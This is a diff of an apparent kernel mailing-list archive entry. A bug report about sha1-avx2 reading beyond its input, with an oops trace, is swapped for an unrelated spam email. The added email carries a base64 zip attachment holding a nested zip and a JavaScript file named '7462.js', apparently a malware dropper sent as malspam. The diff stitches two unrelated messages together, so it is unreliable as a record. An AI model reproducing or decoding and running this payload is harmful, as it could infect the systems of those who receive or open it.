@@ -1,120 +1,105 @@
-From: Jan Stancek <jstancek@redhat.com>
-Subject: [bug] sha1-avx2 and read beyond
-Date: Sat, 29 Apr 2017 19:04:01 -0400 (EDT)
-Message-ID: <1950313665.4516034.1493507041652.JavaMail.zimbra@redhat.com>
-References: <1267529093.4507970.1493505288694.JavaMail.zimbra@redhat.com>
+From: <smallgroups@dudleycvs.org.uk>
+Subject: 26430 linux-crypto
+Date: Sun, 30 Apr 2017 11:30:58 -0000
+Message-ID: <149355185870.14991.8471822211372267336@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
-Cc: mouli@linux.intel.com, herbert@gondor.apana.org.au,
-        Benjamin Coddington <bcodding@redhat.com>, jstancek@redhat.com
-To: linux-crypto@vger.kernel.org
+Content-Type: application/zip; name="9869986954.zip"
+Content-Transfer-Encoding: base64
+To: <linux-crypto@vger.kernel.org>
 Return-path: <linux-crypto-owner@vger.kernel.org>
-Received: from mx1.redhat.com ([209.132.183.28]:40558 "EHLO mx1.redhat.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1032498AbdD2XED (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
-        Sat, 29 Apr 2017 19:04:03 -0400
-In-Reply-To: <1267529093.4507970.1493505288694.JavaMail.zimbra@redhat.com>
+Received: from 114-26-216-157.dynamic-ip.hinet.net ([114.26.216.157]:56960
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S935098AbdD3LbG (ORCPT
+        <rfc822;linux-crypto@vger.kernel.org>);
+        Sun, 30 Apr 2017 07:31:06 -0400
+Content-Disposition: attachment
 Sender: linux-crypto-owner@vger.kernel.org
 List-ID: <linux-crypto.vger.kernel.org>
 
-Hi,
-
-I'm seeing rare crashes during NFS cthon with krb5 auth. After
-some digging I arrived at potential problem with sha1-avx2.
-
-Problem appears to be that sha1_transform_avx2() reads beyond
-number of blocks you pass, if it is an odd number. It appears
-to try read one block more. This creates a problem if it falls
-beyond a page and there's nothing there.
-
-To demonstrate this, I made a module which computes some hashes
-on module load. It allocates 3 pages, passes first two into
-crypto_shash_update() and marks 3rd one as not present.
-
-When it runs for sha1-avx2, it runs into an Oops, trying to
-access 3rd page:
-
-# git clone https://github.com/jstancek/sha1-avx2-crash.git
-# cd sha1-avx2-crash/
-# make
-# insmod sha1_test.ko
-
-[  195.512669] sha1_test: loading out-of-tree module taints kernel.
-[  195.518716] sha1_test: module verification failed: signature and/or required key missing - tainting kernel
-[  195.529754] sha_test module loaded
-[  195.533732] data is at 0xffff97e232ea8000, datalen: 12288, start_offset: 3948, last_byte: 0xffff97e232ea9fff
-[  195.543529] page_after_data is at 0xffff97e232eaa000
-[  195.548603] starting test for sha1-generic
-[  195.552703] count: 148
-[  195.555073] starting test for sha1-ni
-[  195.561282] failed to alloc sha1-ni
-[  195.564776] starting test for sha1-avx
-[  195.568544] count: 148
-[  195.570908] starting test for sha1-avx2
-[  195.574751] count: 148
-[  195.577135] BUG: unable to handle kernel paging request at ffff97e232eaa000
-[  195.584081] IP: _begin+0x173/0x187
-[  195.587478] PGD 213e83067
-[  195.587478] PUD 1033622063
-[  195.590183] PMD 1033181063
-[  195.592974] PTE 8000001032eaa062
-[  195.595769]
-[  195.600487] Oops: 0000 [#1] SMP
-[  195.603627] Modules linked in: sha1_test(OE+) binfmt_misc intel_rapl skx_edac edac_core x86_pkg_temp_thermal intel_powerclamp coretemp
-kvm_intel kvm irqbypass crct10dif_pclmul crc32_pclmul ghash_clmulni_intel vfat pcbc fat aesni_intel crypto_simd glue_helper cryptd ipmi_ss
-if ipmi_si iTCO_wdt ioatdma mei_me ipmi_devintf iTCO_vendor_support pcspkr joydev nfsd sg mei shpchp i2c_i801 dca lpc_ich wmi ipmi_msghand
-ler nfs_acl lockd tpm_crb nfit auth_rpcgss libnvdimm grace acpi_pad acpi_power_meter sunrpc ip_tables xfs libcrc32c sd_mod sr_mod cdrom as
-t i2c_algo_bit drm_kms_helper syscopyarea sysfillrect sysimgblt fb_sys_fops ttm drm i40e ahci ptp libahci crc32c_intel libata pps_core i2c
-_core dm_mirror dm_region_hash dm_log dm_mod
-[  195.667322] CPU: 3 PID: 4725 Comm: insmod Tainted: G           OE   4.11.0-rc8 #1
-[  195.674782] Hardware name: Intel Corporation S2600WFD/S2600WFD, BIOS SE5C620.86B.01.00.0412.020920172159 02/09/2017
-[  195.685185] task: ffff97e22a7b3b00 task.stack: ffffa6f9a57e8000
-[  195.691092] RIP: 0010:_begin+0x173/0x187
-[  195.695005] RSP: 0018:ffffa6f9a57eb5d8 EFLAGS: 00010202
-[  195.700219] RAX: 0000000024a63b1a RBX: 00000000de142126 RCX: 00000000455ad007
-[  195.707336] RDX: 00000000325cbadf RSI: 000000002c3b9293 RDI: 000000009298ec68
-[  195.714451] RBP: 0000000045421007 R08: ffffffff9640a100 R09: ffff97d3771be9d0
-[  195.721567] R10: ffff97e232ea9f2c R11: ffff97e232eaa02c R12: 00000000531d8d12
-[  195.728683] R13: ffff97e232ea9f6c R14: ffffa6f9a57eb878 R15: ffffa6f9a57eb5d8
-[  195.735799] FS:  00007f675ac0c740(0000) GS:ffff97e23dac0000(0000) knlGS:0000000000000000
-[  195.743864] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[  195.749596] CR2: ffff97e232eaa000 CR3: 00000010394ec000 CR4: 00000000007406e0
-[  195.756713] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
-[  195.763828] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
-[  195.770944] PKRU: 55555554
-[  195.773651] Call Trace:
-[  195.776105]  ? dequeue_entity+0xed/0x400
-[  195.780027]  ? console_unlock+0x475/0x4a0
-[  195.784027]  ? sha1_base_init+0x40/0x40
-[  195.787858]  ? sha1_apply_transform_avx2+0x1a/0x30
-[  195.792638]  ? sha1_update+0xd3/0x130
-[  195.796295]  ? sha1_avx2_update+0x15/0x20
-[  195.800301]  ? crypto_shash_update+0x47/0x120
-[  195.804650]  ? calc_hash.constprop.0+0xdc/0xff [sha1_test]
-[  195.810122]  ? sha1test_init+0x113/0x1000 [sha1_test]
-[  195.815163]  ? 0xffffffffc02b7000
-[  195.818473]  ? do_one_initcall+0x51/0x1b0
-[  195.822481]  ? __vunmap+0x85/0xd0
-[  195.825799]  ? kmem_cache_alloc_trace+0x14b/0x1b0
-[  195.830489]  ? kfree+0x133/0x180
-[  195.833716]  ? do_init_module+0x60/0x1fa
-[  195.837638]  ? load_module+0x162b/0x1b20
-[  195.841557]  ? __symbol_put+0x60/0x60
-[  195.845217]  ? ima_post_read_file+0x3d/0x80
-[  195.849397]  ? security_kernel_post_read_file+0x6b/0x80
-[  195.854616]  ? SYSC_finit_module+0xa6/0xf0
-[  195.858704]  ? SyS_finit_module+0xe/0x10
-[  195.862622]  ? do_syscall_64+0x67/0x180
-[  195.866450]  ? entry_SYSCALL64_slow_path+0x25/0x25
-[  195.871230] Code: d0 02 c4 c1 7a 6f 82 90 00 00 00 21 c8 31 e8 42 8d 3c 27 41 03 77 44 c4 e2 40 f2 e9 8d 34 06 c4 63 7b f0 e7 1b c4 e3
-7b f0 c7 02 <c4> c3 7d 18 85 90 00 00 00 01 21 d7 31 ef 42 8d 34 26 eb 00 41
-[  195.890035] RIP: _begin+0x173/0x187 RSP: ffffa6f9a57eb5d8
-[  195.895423] CR2: ffff97e232eaa000
-[  195.898841] ---[ end trace ae28f02b9d28fb26 ]---
-[  195.905994] Kernel panic - not syncing: Fatal exception
-[  195.911412] Kernel Offset: 0x14c00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
-[  195.924685] Rebooting in 10 seconds..
-
-Regards,
-Jan
+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
+AL0SAAAAAA==
